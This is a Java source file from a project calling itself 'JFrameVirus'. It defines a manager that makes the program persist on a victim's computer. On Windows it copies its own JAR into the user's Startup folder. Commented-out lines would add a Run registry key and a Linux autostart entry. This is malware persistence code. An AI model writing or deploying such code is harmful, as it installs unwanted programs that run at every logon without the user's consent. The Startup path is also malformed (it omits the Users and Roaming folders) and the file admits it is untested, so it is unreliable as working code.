package com.joo.jframevirus;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

public class AutoStartManager {
    private final String AUTO_START_REGISTRY_KEY;
    private final String appName;
    private final String userName;

    private static AutoStartManager instance;

    private AutoStartManager() {
        this.appName = "JFrameVirus.jar";
        this.AUTO_START_REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        this.userName = System.getProperty("user.name");
    }

    public static AutoStartManager getInstance() {
        if (instance == null) {
            instance = new AutoStartManager();
        }
        return instance;
    }

    // TODO: test this in windows
    public void addVirusToStartup() {
        if (!this.isVirusInStartup()) {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                try {
                    // TODO: 5/15/22 Test this in windows
                    // Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Virus /t REG_SZ /d \"java -jar jframevirus.jar\"");
                    FileUtils.copyFile(new File(appName),
                            new File("C:\\" + userName +
                            "\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + appName));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else { // TODO: 5/15/22 Make this work on linux and mac
            /*try {
                Runtime.getRuntime().exec("echo \"java -jar jframevirus.jar\" >> ~/.config/autostart/jframevirus.desktop");
            }*/
            }
        }
    }

    public void removeVirusFromStartup() {
        if (this.isVirusInStartup()) {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                new File("C:\\" + userName +
                        "\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + appName).delete();
            } else { // TODO: 5/15/22 Make this work on linux and mac
            }
        }
    }

    private boolean isVirusInStartup() {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            return new File("C:\\" + userName +
                    "\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + appName).exists();
        } else { // TODO: 5/15/22 Make this work on linux and mac
            return false;
        }
    }
}
